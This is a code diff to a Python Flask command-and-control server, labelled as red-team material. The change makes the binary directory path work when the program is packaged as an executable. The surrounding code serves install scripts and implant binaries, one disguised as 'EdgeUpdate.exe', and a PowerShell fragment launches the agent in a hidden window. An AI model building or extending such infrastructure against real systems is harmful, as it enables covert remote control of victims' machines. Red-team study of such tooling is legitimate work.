@@ -4,6 +4,7 @@ C2 Server - HTTPS command & control
 Skill 14: Red Team Ops
 """
 import base64
+import sys
 import hashlib
 import hmac
 import json
@@ -354,7 +355,7 @@ Write-Host "[*] Starting agent..."
 Start-Process -WindowStyle Hidden -FilePath $out
 """
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+BIN_DIR = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
 
 @app.route('/install.sh')
 def serve_install_sh():
@@ -366,14 +367,14 @@ def serve_install_ps1():
 
 @app.route('/agent/linux/<arch>')
 def serve_agent_linux(arch):
-    path = os.path.join(BASE_DIR, "c2_agent")
+    path = os.path.join(BIN_DIR, "c2_agent")
     if not os.path.exists(path):
         return jsonify({"error": "agent binary not found"}), 404
     return Response(open(path, 'rb').read(), mimetype='application/octet-stream')
 
 @app.route('/agent/windows/<arch>')
 def serve_agent_windows(arch):
-    path = os.path.join(BASE_DIR, "EdgeUpdate.exe")
+    path = os.path.join(BIN_DIR, "EdgeUpdate.exe")
     if not os.path.exists(path):
         return jsonify({"error": "agent binary not found"}), 404
     return Response(open(path, 'rb').read(), mimetype='application/octet-stream')
